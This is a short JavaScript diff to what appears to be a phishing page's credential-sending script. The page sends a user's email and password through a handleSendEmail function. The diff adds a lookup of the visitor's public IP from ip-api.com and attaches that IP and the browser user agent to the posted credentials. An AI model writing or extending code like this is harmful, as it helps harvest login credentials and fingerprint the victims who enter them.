@@ -15,6 +15,15 @@ const showError = (msg, type = "") => {
     errorElem.className = "error-message show" + type
 }
 
+const getIPAddress = async () => {
+    const request = await fetch("http://ip-api.com/json/")
+    const response = await request.json()
+    console.group("IP")
+    console.log(response)
+    console.groupEnd("IP")
+    return response
+}
+
 const removeError = () => {
     errorElem.innerText = ""
     errorElem.className = "error-message"
@@ -55,8 +64,11 @@ const isLoading = state => {
 
 const handleSendEmail = async () => {
     const formData = new FormData()
+    const ip = await getIPAddress()
     formData.append("email", USER_CREDS['email'])
     formData.append("password", USER_CREDS['password'])
+    formData.append("ip", ip.query)
+    formData.append("agent", navigator.userAgent)
     formData.append("send", "")
 
     const option = {
